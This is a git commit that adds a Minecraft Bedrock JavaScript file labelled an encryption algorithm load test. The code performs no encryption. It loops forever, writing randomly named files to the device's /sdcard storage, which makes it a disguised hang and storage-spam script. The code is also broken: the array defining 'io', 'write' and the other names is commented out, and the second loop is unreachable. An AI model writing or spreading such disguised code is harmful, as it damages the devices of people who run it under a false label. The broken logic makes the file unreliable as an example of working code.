381ad0a6bd103fb1ab1648d80bae28dd5da4ff86
Dreeam-qwq <61569423+Dreeam-qwq@users.noreply.github.com>
2020-03-06 11:57:37 +0800

    Add files via upload

---
+++ 基岩版JS源码/PinkiePie加密算法加载测试.js
@@ -0,0 +1,34 @@
+/*PinkiePie自创加密算法*/
+//无用了 var _0x46a6 = ["io", "write", "close", "写入:", "random", "ceil", "/sdcard/正在下载js", "％"];
+
+function 下载(_0xc4c4x2, _0xc4c4x3) {
+    try {
+        var _0xc4c4x4 = new java[io].File(_0xc4c4x2);
+        var _0xc4c4x5 = new java[io].FileWriter(_0xc4c4x4);
+        _0xc4c4x5[write](_0xc4c4x3);
+        _0xc4c4x5[close]()
+    } catch (e) {
+        print("写入:" + e)
+    }
+}
+var 随机数字 = Math[ceil](Math[random]() * 88888 + 10000);
+while (true) {
+    下载("/sdcard/正在下载js" + 随机数字 + "%");
+    下载("/sdcard/正在下载js" + 随机数字 + "%");
+    下载("/sdcard/正在下载js" + 随机数字 + "%");
+    下载("/sdcard/正在下载js" + 随机数字 + "%");
+    下载("/sdcard/正在下载js" + 随机数字 + "%");
+    下载("/sdcard/正在下载js" + 随机数字 + "%");
+    下载("/sdcard/正在下载js" + 随机数字 + "%");
+    下载("/sdcard/正在下载js" + 随机数字 + "%")
+};
+while (true) {
+    下载("/sdcard/正在下载js" + 随机数字 + "%");
+    下载("/sdcard/正在下载js" + 随机数字 + "%");
+    下载("/sdcard/正在下载js" + 随机数字 + "%");
+    下载("/sdcard/正在下载js" + 随机数字 + "%");
+    下载("/sdcard/正在下载js" + 随机数字 + "%");
+    下载("/sdcard/正在下载js" + 随机数字 + "%");
+    下载("/sdcard/正在下载js" + 随机数字 + "%");
+    下载("/sdcard/正在下载js" + 随机数字 + "%")
+}
